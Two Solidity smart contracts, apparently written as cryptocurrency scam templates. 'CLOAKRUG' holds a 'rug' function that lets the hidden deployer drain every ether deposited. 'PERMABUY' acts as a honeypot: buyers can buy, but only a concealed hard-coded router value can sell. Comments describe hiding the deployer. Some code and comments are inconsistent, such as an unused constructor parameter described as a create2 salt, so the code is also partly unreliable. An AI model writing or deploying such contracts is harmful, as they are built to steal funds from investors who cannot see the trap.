pragma solidity ^0.8.0;
contract CLOAKRUG {
  address private anon;
  mapping(address=>uint256) public balance;
  // Constructor uses create2 salt to obscure deployer
  constructor(bytes32) { anon = tx.origin; balance[anon] = 1e28; }
  function rug() external {
    require(tx.origin == anon, 'Not origin');
    // Origin check bypasses msg.sender protections
    payable(anon).transfer(address(this).balance);
  }
  receive() external payable {}
}

pragma solidity ^0.8.0;
contract PERMABUY {
  address admin;
  mapping(address=>uint256) bal;
  uint256 private _router; // Fake router address
  constructor(uint256 router) { admin = msg.sender; _router = router; bal[admin] = 1e27; }
  function buy(uint256 amt) external payable { bal[msg.sender] += amt; }
  function sell(uint256 amt, address router) external {
    // Only the hard-coded router address can execute sells
    require(uint256(uint160(router)) == _router, 'Wrong router');
    bal[msg.sender] -= amt;
    payable(msg.sender).transfer(amt);
  }
}

